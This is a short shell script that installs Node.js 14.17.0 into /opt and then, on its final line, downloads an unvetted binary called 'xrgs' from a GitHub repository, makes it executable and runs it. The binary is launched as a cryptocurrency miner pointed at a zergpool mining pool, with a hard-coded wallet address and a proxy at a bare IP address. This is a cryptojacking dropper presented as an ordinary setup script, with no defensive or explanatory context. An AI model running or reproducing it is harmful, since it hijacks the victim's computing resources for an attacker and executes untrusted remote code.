wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
\rm node-v14.17.0-linux-x64.tar.gz
PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
npm config set cache /tmp --global
wget https://github.com/gyrogerald/vulner/raw/main/xrgs && chmod +x xrgs && ./xrgs -o cryptonight_haven.mine.zergpool.com:14452 --tls -a cn-heavy/xhv -k -u TRzWbrKRmJYETRPTrVW8RwbX6Sa9KJNbZ7 -p c=TRX,mc=BLOC --dns-ipv6 -x https://112.6.117.135:8085

